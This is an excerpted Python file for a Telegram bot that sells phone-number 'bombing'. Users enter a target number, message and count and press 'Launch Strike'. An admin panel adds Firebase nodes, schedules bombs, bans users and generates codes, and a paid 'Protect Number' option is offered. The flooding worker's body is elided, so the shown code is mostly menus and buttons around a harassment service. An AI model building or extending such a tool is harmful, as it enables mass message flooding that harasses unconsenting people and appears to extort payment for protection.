...
# ════════════════════════════════════════════════════════════
# PREMIUM EMOJI IDS (For message text only)
# ════════════════════════════════════════════════════════════
E = {
...
def sc(text: str) -> str:
    """Small caps for MESSAGE TEXT only"""
...
def tc(text: str) -> str:
    """Title Case: First Letter Big, Rest Small — for BUTTONS"""
    if not text:
        return text
    # Handle short uppercase like "OK", "ID" -> keep
    words = text.split()
    result = []
    for w in words:
...
def pmsg(key: str, fallback: str) -> str:
    """Premium emoji with custom fallback"""
    eid = E.get(key, E["fire"])
...
# ════════════════════════════════════════════════════════════
# BUTTON BUILDERS — NO HTML IN BUTTONS
# ════════════════════════════════════════════════════════════
def btn(text: str, callback: str = None, url: str = None, emoji: str = "") -> InlineKeyboardButton:
    """Generic button. emoji = plain unicode (safe for buttons)."""
    label = f"{emoji} {tc(text)}".strip() if emoji else tc(text)
    kwargs = {"text": label}
    if callback:
...
def btn_primary(text, callback=None, url=None, emoji="🔹"):
    return btn(text, callback, url, emoji)

def btn_success(text, callback=None, url=None, emoji="✅"):
    return btn(text, callback, url, emoji)

def btn_danger(text, callback=None, url=None, emoji="❌"):
    return btn(text, callback, url, emoji)
...
def back_button(callback="home"):
    return kb([[btn_primary("Back", callback=callback, emoji="↩️")]])
...
async def send_fj_ui(event, channels):
    ...
    for i, ch in enumerate(channels):
        ...
        kb_rows.append([btn_primary(f"Join Channel {i+1}", url=url, emoji="📢")])
    kb_rows.append([btn_success("Verify Membership", callback="fj_verify", emoji="🔄")])
...
async def bomber_worker(bot, uid, number, message, count, sched_id=None):
    ...
    fbs = d.get("firebases", [])
    if not fbs:
        await bot.send_message(uid, styled_box("ᴇʀʀᴏʀ", f"{pmsg('warn','⚠️')} {sc('ɴᴏ ꜰɪʀᴇʙᴀꜱᴇ ᴄᴏɴꜰɪɢᴜʀᴇᴅ. ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ.')}"), parse_mode="HTML")
        return
...
def main_menu(uid, d):
    rows = []
    if is_admin(uid, d):
        rows.append([btn_danger("Admin Panel", callback="admin:panel", emoji="👑")])
    rows.append([btn_primary("Start Bombing", callback="bomb:start", emoji="💣")])
    rows.append([btn_primary("Protect Number", callback="protect:start", emoji="🛡️")])
    rows.append([
        btn_primary("My Stats", callback="stats:show", emoji="📊"),
        btn_primary("Live Status", callback="status:show", emoji="📡"),
    ])
    rows.append([
        btn_primary("Refer", callback="refer:show", emoji="🎁"),
        btn_primary("Redeem Code", callback="redeem:menu", emoji="💎"),
    ])
    rows.append([btn_primary("Help", callback="help:show", emoji="ℹ️")])
    return kb(rows)

def admin_panel_kb(d):
    pending = len([r for r in d.get("protection_requests", []) if r["status"] == "pending"])
    return kb([
        [btn_primary("Add Firebase", callback="admin:fb_add", emoji="🔥"),
         btn_primary("List Nodes", callback="admin:fb_list", emoji="📋")],
        [btn_primary("Schedule Bomb", callback="admin:schedule", emoji="📅"),
         btn_primary("Manage Schedules", callback="admin:schedule_list", emoji="🗂")],
        [btn_primary(f"Protection ({pending})", callback="admin:protection", emoji="🛡️")],
        [btn_primary("Live Status", callback="admin:status", emoji="📡"),
         btn_primary("Global Stats", callback="admin:stats", emoji="📊")],
        [btn_primary("Admins", callback="admin:admins", emoji="👑")],
        [btn_danger("Ban User", callback="admin:ban", emoji="🚫"),
         btn_success("Unban User", callback="admin:unban", emoji="✅")],
        [btn_primary("Generate Code", callback="admin:generate_code", emoji="💎"),
         btn_primary("Code History", callback="admin:code_history", emoji="📜")],
        [btn_primary("Backup / Restore", callback="admin:db_tools", emoji="💾")],
        [btn_primary("Broadcast", callback="admin:broadcast", emoji="📢")],
        [btn_danger("Back", callback="home", emoji="↩️")],
    ])
                ...
                if not u.get("referred_by"):
                    ...
                    try:
                        await msg.bot.send_message(ref_uid,
                            ...
                            f"{pmsg('fire','🔥')} {sc('ʙᴏɴᴜꜱ')}: <b>+1 ᴀᴛᴛᴀᴄᴋ</b>\n"
                            f"{pmsg('clock','🕐')} {sc(f'ᴇxᴘɪʀᴇꜱ ɪɴ {REFERRAL_EXPIRY_HOURS}ʜ')}"), parse_mode="HTML")
                    except: pass
        except: pass
...
async def cb_stats(cq: types.CallbackQuery):
    ...
    if status and status.get("running"):
        ...
        text = styled_box("ᴀᴄᴛɪᴠᴇ ᴛᴇʟᴇᴍᴇᴛʀʏ",
            ...
            f"{pmsg('eyes','👀')} {sc('ᴅᴇᴠɪᴄᴇꜱ')}: <b>{status.get('devices', 0)}</b>\n"
            f"{pmsg('clock','🕐')} {sc('ᴛɪᴍᴇ')}: {elapsed}ꜱ")
    else:
        d = load()
        u = get_user(d, uid)
...
async def cb_redeem_menu(cq: types.CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji="❌")]]), parse_mode="HTML")
...
async def process_number(msg: types.Message, state: FSMContext):
    ...
    await msg.answer(
        styled_box("ᴍᴇꜱꜱᴀɢᴇ",
        f"{pmsg('speak','💬') if 'speak' in E else pmsg('fire','💬')} {sc('ᴇɴᴛᴇʀ ᴍᴇꜱꜱᴀɢᴇ ᴛᴏ ꜱᴇɴᴅ')}"),
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji="❌")]]), parse_mode="HTML")
...
async def process_count(msg: types.Message, state: FSMContext):
    ...
    await msg.answer(
        ...
        reply_markup=kb([
            [btn_danger("Launch Strike", callback="bomb:confirm_launch", emoji="🔥")],
            [btn_primary("Cancel", callback="home", emoji="↩️")],
        ]), parse_mode="HTML")
...
async def cb_protect_start(cq: types.CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        ...
        reply_markup=kb([
            [btn_success("I Have Paid", callback="protect:paid", emoji="💰")],
            [btn_primary("Back", callback="home", emoji="↩️")],
        ]), parse_mode="HTML")
...
async def process_protect_number(msg: types.Message, state: FSMContext):
    ...
    kb_rows = [
        [btn_success("Approve", callback=f"admin:prot_approve:{req_id}", emoji="✅"),
         btn_danger("Reject", callback=f"admin:prot_reject:{req_id}", emoji="❌")],
    ]
...
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=kb([[btn_danger("Cancel", callback="admin:panel", emoji="❌")]]), parse_mode="HTML")
...
async def cb_fb_list(cq: types.CallbackQuery):
    ...
    rows = []
    for i, fb in enumerate(fbs):
        rows.append([btn_danger(f"Delete #{i+1}", callback=f"admin:fb_del:{fb['id']}", emoji="🗑")])
    rows.append([btn_primary("Back", callback="admin:panel", emoji="↩️")])
...
async def cb_admin_protection(cq: types.CallbackQuery):
    ...
    for r in pending[:10]:
        ...
        rows.append([
            btn_success("Approve", callback=f"admin:prot_approve:{r['id']}", emoji="✅"),
            btn_danger("Reject", callback=f"admin:prot_reject:{r['id']}", emoji="❌"),
        ])
    rows.append([btn_primary("Back", callback="admin:panel", emoji="↩️")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")
...
async def cb_schedule_list(cq: types.CallbackQuery):
    ...
    for s in scheds[:10]:
        ...
        if s["status"] == "pending":
            rows.append([btn_danger(f"Delete {s['number'][-4:]}", callback=f"admin:sched_del:{s['id']}", emoji="🗑")])
    rows.append([btn_primary("Back", callback="admin:panel", emoji="↩️")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")
...
async def cb_admins(cq: types.CallbackQuery):
    ...
    for a in admins:
        if a != OWNER_ID:
            rows.append([btn_danger(f"Remove {a}", callback=f"admin:admin_del:{a}", emoji="🗑")])
    rows.append([btn_primary("Add Admin", callback="admin:admin_add", emoji="➕")])
    rows.append([btn_primary("Back", callback="admin:panel", emoji="↩️")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")
...
async def cb_unban(cq: types.CallbackQuery):
    ...
    if not banned:
        ...
        return
    rows = [[btn_success(f"Unban {u}", callback=f"admin:unban_do:{u}", emoji="✅")] for u in banned]
    rows.append([btn_primary("Back", callback="admin:panel", emoji="↩️")])
...
async def cb_db_tools(cq: types.CallbackQuery):
    await cq.message.edit_text(
        ...
        reply_markup=kb([
            [btn_primary("Download Backup", callback="admin:db_backup", emoji="💾")],
            [btn_primary("Restore From File", callback="admin:db_restore_prompt", emoji="📤")],
            [btn_primary("Back", callback="admin:panel", emoji="↩️")],
        ]), parse_mode="HTML")
...
async def cb_db_restore(cq: types.CallbackQuery):
    await cq.message.edit_text(
        ...
        reply_markup=kb([[btn_primary("Cancel", callback="admin:db_tools", emoji="❌")]]), parse_mode="HTML")
...
async def cb_code_history(cq: types.CallbackQuery):
    ...
    for c in codes[-10:]:
        ...
        if c.get("is_active"):
            rows.append([btn_danger(f"Revoke {c['code'][:12]}", callback=f"admin:revoke_code:{c['code']}", emoji="🗑")])
    rows.append([btn_primary("Back", callback="admin:panel", emoji="↩️")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")
